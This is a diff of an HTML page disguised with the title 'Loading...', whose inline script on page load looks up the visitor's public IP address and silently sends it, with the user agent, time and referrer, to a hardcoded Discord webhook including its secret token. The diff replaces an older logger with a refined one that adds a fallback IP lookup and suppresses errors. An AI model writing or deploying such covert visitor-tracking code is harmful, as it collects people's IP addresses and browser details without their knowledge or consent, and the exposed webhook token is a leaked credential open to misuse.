@@ -3,42 +3,50 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>...</title>
+  <title>Loading...</title>
 </head>
 <body>
 
 <script>
 const WEBHOOK = "https://discord.com/api/webhooks/1474171731320115314/K1ZIVm53yR5pu8Ghf93U4BpDCQqVM7eFxdBtx4KgfB5TKym9zrF8kBEmNWzn68dzv2hp";
 
-(async function() {
+(async () => {
   let ip = "unknown";
+
   try {
     const res = await fetch("https://api.ipify.org?format=json");
-    ip = (await res.json()).ip;
-  } catch (e) {
-    console.log("IP fetch error:", e);
-  }
-
-  const time = new Date().toISOString().replace("T", " ").slice(0, 19) + " UTC";
-  
-  // Short + safe UA (max ~200 chars, replace " with ')
-  let ua = navigator.userAgent.slice(0, 180).replace(/"/g, "'").replace(/\\/g, "/");
-
-  const content = `Visitor • ${time} • IP: ${ip} • UA: ${ua}`;
-
-  console.log("Trying to send:", content);
-
-  try {
-    await fetch(WEBHOOK, {
-      method: "POST",
-      mode: "no-cors",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ content })
-    });
-    console.log("Request sent — check Discord in 5-10s (or Network tab for status)");
+    const data = await res.json();
+    ip = data.ip;
   } catch (err) {
-    console.error("Fetch crashed:", err);
+    // fallback if ipify is down/blocked
+    try {
+      const res2 = await fetch("https://api64.ipify.org?format=json");
+      const data2 = await res2.json();
+      ip = data2.ip;
+    } catch {}
   }
+
+  const now = new Date().toISOString().slice(0, 19).replace("T", " ");
+
+  const payload = {
+    embeds: [{
+      title: "New visitor",
+      color: 0xFF5555,
+      fields: [
+        { name: "Time",     value: now + " UTC", inline: true },
+        { name: "IP",       value: "`" + ip + "`", inline: true },
+        { name: "UA",       value: "```" + navigator.userAgent.slice(0, 300) + "```" },
+        { name: "Referrer", value: document.referrer || "direct", inline: false }
+      ],
+      timestamp: new Date().toISOString()
+    }]
+  };
+
+  fetch(WEBHOOK, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload)
+  }).catch(() => {});   // silent fail
 })();
 </script>
 
